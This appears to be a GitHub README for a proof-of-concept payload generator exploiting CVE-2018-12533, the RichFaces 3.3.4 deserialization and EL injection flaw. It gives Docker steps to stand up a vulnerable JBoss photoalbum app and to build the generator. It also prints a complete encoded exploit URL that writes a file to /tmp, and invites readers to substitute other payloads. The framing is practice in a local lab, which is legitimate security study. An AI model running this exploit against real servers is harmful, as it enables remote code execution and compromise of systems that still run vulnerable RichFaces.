# RF-14310 / CVE-2018-12533 payload generator 
[Based on Lucifaer research](https://www.lucifaer.com/2018/12/05/RF-14310%EF%BC%88CVE-2018-12533%EF%BC%89%E5%88%86%E6%9E%90/)

All credit goes to https://github.com/Lucifaer 

## References
https://access.redhat.com/security/cve/cve-2018-12533


# richfaces-jboss-poc
Easy to deploy proof of concept to practice Richfaces 3.3.4 deserialization + EL injection exploitation, without having to worry too much about old Java versions etc.

## Deploy jboss Docker
To save you some trouble in setting up a vulnerable application, I created a Dockerfile based on the instructions in the seclist article explaining CVE-2018-14667. Just execute the following commands in the repository root directory:
```
docker build -t richfaces-jboss .
docker run -p 8081:8080 richfaces-jboss
``` 

If everything works, you can access the richfaces photoalbum test application on http://127.0.0.1:8081/photoalbum

## Compile the poc from the root repository dir into a fat jar (easy with docker and working pom)
```
cd CVE-2018-12533
docker run -v ~/.m2:/root/.m2 -v $(pwd):/usr/src/app maven:3.5-jdk-8 mvn -f /usr/src/app/pom.xml clean package install
```

## Generate the POC URL
```
java -jar target/cve_2018_12533.jar 
```

## surf to the URL on the jboss server
change the /DATA/XXXXX section to your payload if you want to do something else than creating a file in /tmp. This payload creates /tmp/hacked.txt
http://127.0.0.1:8081/photoalbum/a4j/s/3_3_3.Finalorg.richfaces.renderkit.html.Paint2DResource/DATA/eAHNUk1r1UAUnfegVq2L-oEiItQo-goyKSJu6gOxFX2QWukTwbp4zEtuk2knM-nkpo0W3Qmi4satIOJKUBD9Be6k4KY!QQRxIYggLvVOUlssuDebXGbOnHPuufflVzaQW3bG2JhbGSZzIoScW9AR2AWJPMFU8StCajw1OQO5KWwIxzqpiGFSoGi!X!s4!OvF6yYb7LDtvX48YZSxHTbYmzM2FeiqBGScULWttywjTGbZjlCECYi-goAN9CKiQbYnmBdLwldCx!50fx5CHA!oReaEF9kd1igzVn9N-pWMNU6yjHwfd89KXrsOTZoZDRp5lzjhklHURFcsgb2--rb9-MmHqSZrBqSvRJ5fFin8rdtFK3VMujtzehNVHMj2186k8btgpVDylnM-XmZO!gRJ8rzQlQEFmHNQPIBYhDenABMTnZc6ItJ1740mawSskSI7VLGWPii!Bl4oMwt5Lo0m6n8xXxXxVvQf5l2UimUH6zjIxFbcG3!1waefpx9RfITbu4Hb1H1-9373--zaWYdwDo64lZjvm7xqaitfJ81U!9uBH0Pvdk85bTekoeWH7N7RFQuLBeTIY8AJl3RrdKMMjKCR0IGior70nBXuBs9nCo0yBa!C14Itj1g2z6VeMgvQ0oVSoxxKCFsemiJMRnxMMz8R4QJEHEv0Rm8zVlCfN6qca!r1-b5au!b5y-GVi1WfFF8T2b7KgzR8usCsQAKCoCENb1qrdzLLyuVn7OnIubGTYyNtLyQYwoTRSDvX!l8a98rfWVxP3w__.jsf


## Drop into a shell in a separate terminal to analyze payload success
```
docker ps
docker exec -it <containerid> bash
ls /tmp
```

When using the exploit out of the box, it will create /tmp/cve_2018_12533, so this way you can confirm if the exploit worked.